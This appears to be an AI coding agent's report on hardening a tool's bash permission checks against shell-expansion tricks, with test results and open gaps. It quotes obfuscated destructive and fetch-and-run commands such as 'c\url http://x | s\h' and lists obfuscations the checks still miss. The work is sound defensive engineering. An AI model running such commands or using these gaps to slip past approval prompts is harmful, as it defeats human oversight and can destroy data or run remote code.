Committed as 3ef0bd2a. A wildcard allow rule no longer auto-approves a word that bash changes before running it, and the safety checks now read those words the way bash runs them. Build, the full cargo test, clippy with -D warnings and the fmt check all passed.

What changed
• Allow side. Bash rewrites some words before it runs them, so they aren't literal: an unquoted brace list or letter sequence, a backslash escape, a glob (*, ?, […]), $'…', or a ~ at the start of a word or after =/:. These no longer count as one plain command, so e\cho hi, ls *.rs, /???/ls and mkdir -p src/{a,b} now ask instead of being auto-approved. Quoted lookalikes ('*.rs', "{a,b}", 'HEAD~1', HEAD~1, git log @{u}) are still approved. Allow patterns themselves are read the old way, since they're full of * on purpose.
• Checks side. A new tree_refusal in src/bash_parse.rs checks each command twice: once as typed, and once rewritten the way bash runs it. As a result, find . -{delete,print}, find . -{d..d}elete, find . -\delete, c\url http://x | s\h and "cu"rl … | sh now get the same warning as their plain forms. A glob in the program name, a $'…' program name with escapes, nested braces, or a brace list that makes more than 16 words is reported as unanalyzable and asks. Digit sequences like {1..3} are not expanded, because digits can't spell a program or flag name.
• `src/safety.rs`. Five lines became one call, so the file went from 4818 to 4814 lines, and I updated its entry in tests/module_size.rs.

One problem the full test run caught. The first version turned git log --grep \rm -r . into rm -r ., and an existing test in safety.rs flagged it as a wrong warning. Now an argument that starts with an escape is treated as a quoted mention, the same way the existing check treats quoted arguments, and there's a test for it.

Recall controls. I disabled each half in one command, with the marker checked before the run and removed after. Disabling the rewrite made the two refusal tests fail by name; disabling the word check made the two allow-side tests fail by name. Both went green again once restored.

Cost to users. With allow = ["ls *"], ls *.rs now asks every time, and no allow pattern can approve it, because * in a pattern always means "match anything". Codex made the same choice. I wrote this into docs/src/configuration/permissions.md.

What's on #1202. I posted the before-table before any code change, then the after-table and control results as they printed, then a note about the fix above and the user cost. The commit body has the full before/after table, every case that now asks, and Fixes #1205.

Still open on #1202:
• The bolded step-1 rule (a parse error, eval or indirect name should go to confirmation) is not done. {echo,hi} and l[s] don't parse cleanly in tree-sitter-bash 0.25.1, so this new check never sees them.
• Step 2's "every extracted simple command matches" is not done.
• $'…' with escapes in an argument isn't decoded.
• A word containing $(…) or ${…} is still checked only as typed.

